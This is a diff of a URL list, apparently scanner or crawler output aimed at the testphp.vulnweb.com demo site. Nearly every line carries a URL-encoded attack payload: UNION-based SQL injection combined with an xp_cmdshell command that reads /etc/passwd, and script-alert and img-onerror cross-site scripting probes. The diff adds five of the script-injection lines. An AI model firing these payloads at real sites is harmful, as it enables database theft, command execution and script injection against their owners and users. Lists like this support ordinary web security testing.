@@ -90,6 +90,11 @@ http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&LDeO=5891%20AND%201%3D1%20UN
 http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&YVeN=2411%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
 http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&fYij=6906%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
 http://testphp.vulnweb.com/AJAX/infoartist.php?id=1&uiDo=4470%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23
+http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/3/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-1/3L/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://testphp.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-2/3L/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/Connection:/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://testphp.vulnweb.com/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/wp-content/plugins/flexible-custom-post-type/edit-post.php?id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-
 http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=-%27&gt=
 http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&mjqN=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
